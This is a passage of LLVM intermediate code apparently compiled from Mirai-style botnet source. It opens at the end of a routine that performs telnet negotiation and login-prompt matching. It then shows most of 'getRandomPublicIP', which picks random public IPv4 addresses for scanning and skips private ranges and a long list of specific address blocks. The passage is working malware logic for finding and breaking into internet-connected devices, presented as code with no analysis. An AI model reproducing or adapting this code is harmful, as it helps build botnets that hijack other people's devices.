; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, %113
  store i32 %115, i32* %18, align 4
  %116 = load i32, i32* %10, align 4
  %117 = load i8*, i8** %23, align 8
  %118 = call i32 @negotiate(i32 %116, i8* %117, i32 3)
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %121, label %120

; <label>:120:                                    ; preds = %112
  store i32 0, i32* %9, align 4
  br label %142

; <label>:121:                                    ; preds = %112
  br label %136

; <label>:122:                                    ; preds = %92
  %123 = load i8*, i8** %15, align 8
  %124 = load i8*, i8** %11, align 8
  %125 = call i8* @strstr(i8* %123, i8* %124) #10
  %126 = icmp ne i8* %125, null
  br i1 %126, label %134, label %127

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %12, align 4
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
  %131 = load i8*, i8** %15, align 8
  %132 = call i32 @matchPrompt(i8* %131)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130, %122
  store i32 1, i32* %20, align 4
  br label %137

; <label>:135:                                    ; preds = %130, %127
  br label %136

; <label>:136:                                    ; preds = %135, %121
  br label %33

; <label>:137:                                    ; preds = %134, %76, %48
  %138 = load i32, i32* %20, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  store i32 1, i32* %9, align 4
  br label %142

; <label>:141:                                    ; preds = %137
  store i32 0, i32* %9, align 4
  br label %142

; <label>:142:                                    ; preds = %141, %140, %120, %111, %91
  %143 = load i32, i32* %9, align 4
  ret i32 %143
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %27

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %27

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = add i8 %12, 1
  store i8 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %14 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 16, i32 16, i1 false)
  %15 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %17 = zext i8 %16 to i32
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %23 = zext i8 %22 to i32
  %24 = call i32 (i8*, i8*, ...) @szprintf(i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i32 0, i32 0), i32 %17, i32 %19, i32 %21, i32 %23)
  %25 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %26 = call i32 @inet_addr(i8* %25) #2
  store i32 %26, i32* %1, align 4
  br label %565

; <label>:27:                                     ; preds = %7, %0
  %28 = call i32 @rand() #2
  %29 = srem i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %31 = call i32 @rand() #2
  %32 = srem i32 %31, 255
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %34 = call i32 @rand() #2
  %35 = srem i32 %34, 255
  %36 = trunc i32 %35 to i8
  store i8 %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %37 = call i32 @rand() #2
  %38 = srem i32 %37, 255
  %39 = trunc i32 %38 to i8
  store i8 %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %40

; <label>:40:                                     ; preds = %538, %27
  %41 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %536, label %44

; <label>:44:                                     ; preds = %40
  %45 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 10
  br i1 %47, label %536, label %48

; <label>:48:                                     ; preds = %44
  %49 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 100
  br i1 %51, label %52, label %60

; <label>:52:                                     ; preds = %48
  %53 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %54 = zext i8 %53 to i32
  %55 = icmp sge i32 %54, 64
  br i1 %55, label %56, label %60

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %58 = zext i8 %57 to i32
  %59 = icmp sle i32 %58, 127
  br i1 %59, label %536, label %60

; <label>:60:                                     ; preds = %56, %52, %48
  %61 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %62, 127
  br i1 %63, label %536, label %64

; <label>:64:                                     ; preds = %60
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 169
  br i1 %67, label %68, label %72

; <label>:68:                                     ; preds = %64
  %69 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %70 = zext i8 %69 to i32
  %71 = icmp eq i32 %70, 254
  br i1 %71, label %536, label %72

; <label>:72:                                     ; preds = %68, %64
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 %74, 172
  br i1 %75, label %76, label %84

; <label>:76:                                     ; preds = %72
  %77 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %78 = zext i8 %77 to i32
  %79 = icmp sle i32 %78, 16
  br i1 %79, label %80, label %84

; <label>:80:                                     ; preds = %76
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %82 = zext i8 %81 to i32
  %83 = icmp sle i32 %82, 31
  br i1 %83, label %536, label %84

; <label>:84:                                     ; preds = %80, %76, %72
  %85 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 192
  br i1 %87, label %88, label %96

; <label>:88:                                     ; preds = %84
  %89 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %92, label %96

; <label>:92:                                     ; preds = %88
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %94 = zext i8 %93 to i32
  %95 = icmp eq i32 %94, 2
  br i1 %95, label %536, label %96

; <label>:96:                                     ; preds = %92, %88, %84
  %97 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 192
  br i1 %99, label %100, label %108

; <label>:100:                                    ; preds = %96
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 88
  br i1 %103, label %104, label %108

; <label>:104:                                    ; preds = %100
  %105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 99
  br i1 %107, label %536, label %108

; <label>:108:                                    ; preds = %104, %100, %96
  %109 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 192
  br i1 %111, label %112, label %116

; <label>:112:                                    ; preds = %108
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 168
  br i1 %115, label %536, label %116

; <label>:116:                                    ; preds = %112, %108
  %117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 198
  br i1 %119, label %120, label %128

; <label>:120:                                    ; preds = %116
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 18
  br i1 %123, label %536, label %124

; <label>:124:                                    ; preds = %120
  %125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 19
  br i1 %127, label %536, label %128

; <label>:128:                                    ; preds = %124, %116
  %129 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 198
  br i1 %131, label %132, label %140

; <label>:132:                                    ; preds = %128
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 51
  br i1 %135, label %136, label %140

; <label>:136:                                    ; preds = %132
  %137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 100
  br i1 %139, label %536, label %140

; <label>:140:                                    ; preds = %136, %132, %128
  %141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %142, 203
  br i1 %143, label %144, label %152

; <label>:144:                                    ; preds = %140
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  br i1 %147, label %148, label %152

; <label>:148:                                    ; preds = %144
  %149 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 113
  br i1 %151, label %536, label %152

; <label>:152:                                    ; preds = %148, %144, %140
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 188
  br i1 %155, label %156, label %164

; <label>:156:                                    ; preds = %152
  %157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 209
  br i1 %159, label %160, label %164

; <label>:160:                                    ; preds = %156
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 52
  br i1 %163, label %536, label %164

; <label>:164:                                    ; preds = %160, %156, %152
  %165 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 188
  br i1 %167, label %168, label %176

; <label>:168:                                    ; preds = %164
  %169 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 209
  br i1 %171, label %172, label %176

; <label>:172:                                    ; preds = %168
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %174 = zext i8 %173 to i32
  %175 = icmp eq i32 %174, 49
  br i1 %175, label %536, label %176

; <label>:176:                                    ; preds = %172, %168, %164
  %177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 185
  br i1 %179, label %180, label %188

; <label>:180:                                    ; preds = %176
  %181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 62
  br i1 %183, label %184, label %188

; <label>:184:                                    ; preds = %180
  %185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 190
  br i1 %187, label %536, label %188

; <label>:188:                                    ; preds = %184, %180, %176
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 185
  br i1 %191, label %192, label %200

; <label>:192:                                    ; preds = %188
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 62
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %192
  %197 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %198 = zext i8 %197 to i32
  %199 = icmp eq i32 %198, 189
  br i1 %199, label %536, label %200

; <label>:200:                                    ; preds = %196, %192, %188
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %202 = zext i8 %201 to i32
  %203 = icmp eq i32 %202, 185
  br i1 %203, label %204, label %212

; <label>:204:                                    ; preds = %200
  %205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 62
  br i1 %207, label %208, label %212

; <label>:208:                                    ; preds = %204
  %209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 188
  br i1 %211, label %536, label %212

; <label>:212:                                    ; preds = %208, %204, %200
  %213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %214 = zext i8 %213 to i32
  %215 = icmp eq i32 %214, 185
  br i1 %215, label %216, label %224

; <label>:216:                                    ; preds = %212
  %217 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 61
  br i1 %219, label %220, label %224

; <label>:220:                                    ; preds = %216
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 137
  br i1 %223, label %536, label %224

; <label>:224:                                    ; preds = %220, %216, %212
  %225 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 185
  br i1 %227, label %228, label %236

; <label>:228:                                    ; preds = %224
  %229 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %230 = zext i8 %229 to i32
  %231 = icmp eq i32 %230, 61
  br i1 %231, label %232, label %236

; <label>:232:                                    ; preds = %228
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 136
  br i1 %235, label %536, label %236

; <label>:236:                                    ; preds = %232, %228, %224
  %237 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %238 = zext i8 %237 to i32
  %239 = icmp eq i32 %238, 185
  br i1 %239, label %240, label %248

; <label>:240:                                    ; preds = %236
  %241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 11
  br i1 %243, label %244, label %248

; <label>:244:                                    ; preds = %240
  %245 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 147
  br i1 %247, label %536, label %248

; <label>:248:                                    ; preds = %244, %240, %236
  %249 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 185
  br i1 %251, label %252, label %260

; <label>:252:                                    ; preds = %248
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 11
  br i1 %255, label %256, label %260

; <label>:256:                                    ; preds = %252
  %257 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %258 = zext i8 %257 to i32
  %259 = icmp eq i32 %258, 146
  br i1 %259, label %536, label %260

; <label>:260:                                    ; preds = %256, %252, %248
  %261 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %262 = zext i8 %261 to i32
  %263 = icmp eq i32 %262, 185
  br i1 %263, label %264, label %272

; <label>:264:                                    ; preds = %260
  %265 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %266 = zext i8 %265 to i32
  %267 = icmp eq i32 %266, 11
  br i1 %267, label %268, label %272

; <label>:268:                                    ; preds = %264
  %269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %270 = zext i8 %269 to i32
  %271 = icmp eq i32 %270, 145
  br i1 %271, label %536, label %272

; <label>:272:                                    ; preds = %268, %264, %260
  %273 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 63
  br i1 %275, label %276, label %284

; <label>:276:                                    ; preds = %272
  %277 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %278 = zext i8 %277 to i32
  %279 = icmp eq i32 %278, 141
  br i1 %279, label %280, label %284

; <label>:280:                                    ; preds = %276
  %281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %282 = zext i8 %281 to i32
  %283 = icmp eq i32 %282, 241
  br i1 %283, label %536, label %284

; <label>:284:                                    ; preds = %280, %276, %272
  %285 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %286 = zext i8 %285 to i32
  %287 = icmp eq i32 %286, 69
  br i1 %287, label %288, label %296

; <label>:288:                                    ; preds = %284
  %289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %290 = zext i8 %289 to i32
  %291 = icmp eq i32 %290, 30
  br i1 %291, label %292, label %296

; <label>:292:                                    ; preds = %288
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %294 = zext i8 %293 to i32
  %295 = icmp eq i32 %294, 192
  br i1 %295, label %536, label %296

; <label>:296:                                    ; preds = %292, %288, %284
  %297 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %298 = zext i8 %297 to i32
  %299 = icmp eq i32 %298, 69
  br i1 %299, label %300, label %308

; <label>:300:                                    ; preds = %296
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %302 = zext i8 %301 to i32
  %303 = icmp eq i32 %302, 30
  br i1 %303, label %304, label %308

; <label>:304:                                    ; preds = %300
  %305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 244
  br i1 %307, label %536, label %308

; <label>:308:                                    ; preds = %304, %300, %296
  %309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 69
  br i1 %311, label %312, label %320

; <label>:312:                                    ; preds = %308
  %313 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %314 = zext i8 %313 to i32
  %315 = icmp eq i32 %314, 197
  br i1 %315, label %316, label %320

; <label>:316:                                    ; preds = %312
  %317 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %318 = zext i8 %317 to i32
  %319 = icmp eq i32 %318, 128
  br i1 %319, label %536, label %320

; <label>:320:                                    ; preds = %316, %312, %308
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %322 = zext i8 %321 to i32
  %323 = icmp eq i32 %322, 162
  br i1 %323, label %324, label %332

; <label>:324:                                    ; preds = %320
  %325 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 251
  br i1 %327, label %328, label %332

; <label>:328:                                    ; preds = %324
  %329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %330 = zext i8 %329 to i32
  %331 = icmp eq i32 %330, 120
  br i1 %331, label %536, label %332

; <label>:332:                                    ; preds = %328, %324, %320
  %333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %334 = zext i8 %333 to i32
  %335 = icmp eq i32 %334, 173
  br i1 %335, label %336, label %344

; <label>:336:                                    ; preds = %332
  %337 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %338 = zext i8 %337 to i32
  %339 = icmp eq i32 %338, 208
  br i1 %339, label %340, label %344

; <label>:340:                                    ; preds = %336
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %342 = zext i8 %341 to i32
  %343 = icmp eq i32 %342, 128
  br i1 %343, label %536, label %344

; <label>:344:                                    ; preds = %340, %336, %332
  %345 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %346 = zext i8 %345 to i32
  %347 = icmp eq i32 %346, 173
  br i1 %347, label %348, label %356

; <label>:348:                                    ; preds = %344
  %349 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %350 = zext i8 %349 to i32
  %351 = icmp eq i32 %350, 208
  br i1 %351, label %352, label %356

; <label>:352:                                    ; preds = %348
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %354 = zext i8 %353 to i32
  %355 = icmp eq i32 %354, 180
  br i1 %355, label %536, label %356

; <label>:356:                                    ; preds = %352, %348, %344
  %357 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 173
  br i1 %359, label %360, label %368

; <label>:360:                                    ; preds = %356
  %361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %362 = zext i8 %361 to i32
  %363 = icmp eq i32 %362, 208
  br i1 %363, label %364, label %368

; <label>:364:                                    ; preds = %360
  %365 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 250
  br i1 %367, label %536, label %368

; <label>:368:                                    ; preds = %364, %360, %356
  %369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %370 = zext i8 %369 to i32
  %371 = icmp eq i32 %370, 192
  br i1 %371, label %372, label %380

; <label>:372:                                    ; preds = %368
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 187
  br i1 %375, label %376, label %380

; <label>:376:                                    ; preds = %372
  %377 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %378 = zext i8 %377 to i32
  %379 = icmp eq i32 %378, 113
  br i1 %379, label %536, label %380

; <label>:380:                                    ; preds = %376, %372, %368
  %381 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %382 = zext i8 %381 to i32
  %383 = icmp eq i32 %382, 198
  br i1 %383, label %384, label %392

; <label>:384:                                    ; preds = %380
  %385 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %386 = zext i8 %385 to i32
  %387 = icmp eq i32 %386, 204
  br i1 %387, label %388, label %392

; <label>:388:                                    ; preds = %384
  %389 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 241
  br i1 %391, label %536, label %392

; <label>:392:                                    ; preds = %388, %384, %380
  %393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %394 = zext i8 %393 to i32
  %395 = icmp eq i32 %394, 204
  br i1 %395, label %396, label %404

; <label>:396:                                    ; preds = %392
  %397 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %398 = zext i8 %397 to i32
  %399 = icmp eq i32 %398, 10
  br i1 %399, label %400, label %404

; <label>:400:                                    ; preds = %396
  %401 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %402 = zext i8 %401 to i32
  %403 = icmp eq i32 %402, 160
  br i1 %403, label %536, label %404

; <label>:404:                                    ; preds = %400, %396, %392
  %405 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %406 = zext i8 %405 to i32
  %407 = icmp eq i32 %406, 204
  br i1 %407, label %408, label %416

; <label>:408:                                    ; preds = %404
  %409 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %410 = zext i8 %409 to i32
  %411 = icmp eq i32 %410, 12
  br i1 %411, label %412, label %416

; <label>:412:                                    ; preds = %408
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %414 = zext i8 %413 to i32
  %415 = icmp eq i32 %414, 192
  br i1 %415, label %536, label %416

; <label>:416:                                    ; preds = %412, %408, %404
  %417 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %418 = zext i8 %417 to i32
  %419 = icmp eq i32 %418, 208
  br i1 %419, label %420, label %428

; <label>:420:                                    ; preds = %416
  %421 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %422 = zext i8 %421 to i32
  %423 = icmp eq i32 %422, 110
  br i1 %423, label %424, label %428

; <label>:424:                                    ; preds = %420
  %425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %426 = zext i8 %425 to i32
  %427 = icmp eq i32 %426, 64
  br i1 %427, label %536, label %428

; <label>:428:                                    ; preds = %424, %420, %416
  %429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %430 = zext i8 %429 to i32
  %431 = icmp eq i32 %430, 208
  br i1 %431, label %432, label %440

; <label>:432:                                    ; preds = %428
  %433 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
